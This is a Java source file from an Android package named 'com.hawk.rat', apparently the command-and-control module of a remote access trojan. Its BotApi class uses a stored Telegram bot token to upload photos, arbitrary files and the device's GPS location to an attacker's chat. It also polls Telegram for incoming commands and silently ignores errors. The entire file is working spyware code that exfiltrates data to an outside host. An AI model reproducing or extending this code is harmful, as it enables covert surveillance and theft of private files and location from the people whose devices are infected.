package com.hawk.rat;
import android.content.Context;
import okhttp3.*;
import org.json.JSONObject;
import java.io.File;
import java.util.concurrent.TimeUnit;
public class BotApi {
    public static String getToken(Context ctx) { return ctx.getSharedPreferences("hawk_prefs", Context.MODE_PRIVATE).getString("bot_token", ""); }
    public static String getChatId(Context ctx) { return ctx.getSharedPreferences("hawk_prefs", Context.MODE_PRIVATE).getString("chat_id", ""); }
    private static final OkHttpClient client = new OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).writeTimeout(60, TimeUnit.SECONDS).build();
    private static String baseUrl(Context ctx) { return "https://api.telegram.org/bot" + getToken(ctx) + "/"; }
    public static void sendMessage(Context ctx, String text) {
        try {
            RequestBody body = new FormBody.Builder().add("chat_id", getChatId(ctx)).add("text", text).build();
            Request req = new Request.Builder().url(baseUrl(ctx) + "sendMessage").post(body).build();
            client.newCall(req).execute().close();
        } catch (Exception ignored) {}
    }
    public static void sendPhoto(Context ctx, File file, String caption) {
        try {
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("image/*"));
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", getChatId(ctx)).addFormDataPart("caption", caption).addFormDataPart("photo", file.getName(), fileBody).build();
            Request req = new Request.Builder().url(baseUrl(ctx) + "sendPhoto").post(body).build();
            client.newCall(req).execute().close();
        } catch (Exception e) { sendMessage(ctx, "sendPhoto failed: " + e.getMessage()); }
    }
    public static void sendFile(Context ctx, File file, String caption) {
        try {
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", getChatId(ctx)).addFormDataPart("caption", caption).addFormDataPart("document", file.getName(), fileBody).build();
            Request req = new Request.Builder().url(baseUrl(ctx) + "sendDocument").post(body).build();
            client.newCall(req).execute().close();
        } catch (Exception e) { sendMessage(ctx, "sendFile failed: " + e.getMessage()); }
    }
    public static void sendLocation(Context ctx, double lat, double lon) {
        try {
            RequestBody body = new FormBody.Builder().add("chat_id", getChatId(ctx)).add("latitude", String.valueOf(lat)).add("longitude", String.valueOf(lon)).build();
            Request req = new Request.Builder().url(baseUrl(ctx) + "sendLocation").post(body).build();
            client.newCall(req).execute().close();
        } catch (Exception ignored) {}
    }
    public static JSONObject getUpdates(Context ctx, long offset) throws Exception {
        String url = baseUrl(ctx) + "getUpdates?timeout=30&offset=" + offset;
        Request req = new Request.Builder().url(url).get().build();
        try (Response resp = client.newCall(req).execute()) { return new JSONObject(resp.body().string()); }
    }
}
